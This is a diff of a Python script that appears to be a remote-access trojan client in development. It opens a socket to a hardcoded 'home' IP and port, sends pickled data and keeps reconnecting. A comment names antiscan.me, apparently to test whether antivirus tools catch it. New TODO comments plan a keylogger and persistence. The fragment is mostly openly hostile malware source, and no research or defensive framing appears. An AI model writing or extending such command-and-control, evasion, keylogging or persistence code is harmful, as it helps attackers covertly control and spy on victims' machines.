@@ -1,9 +1,8 @@
 #use https://antiscan.me
 import datetime, glob, os
 import socket, pickle, time, platform, psutil
+import sys
 import traceback, subprocess
-#from Crypto.PublicKey import RSA
-#from Crypto.Cipher import PKCS1_OAEP
 
 home = ('192.168.0.224', 5000) #192.168.0.224
 conn = None
@@ -24,8 +23,11 @@ def send(msg):
     conn.sendall(pickle.dumps({'incoming': len(msg)}))
     conn.sendall(msg)
 
-def run():
+def run(): #todo add keylogger?
     global conn_open, conn
+
+    #todo figure out persistance
+
     while True:
         if not conn:
             conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
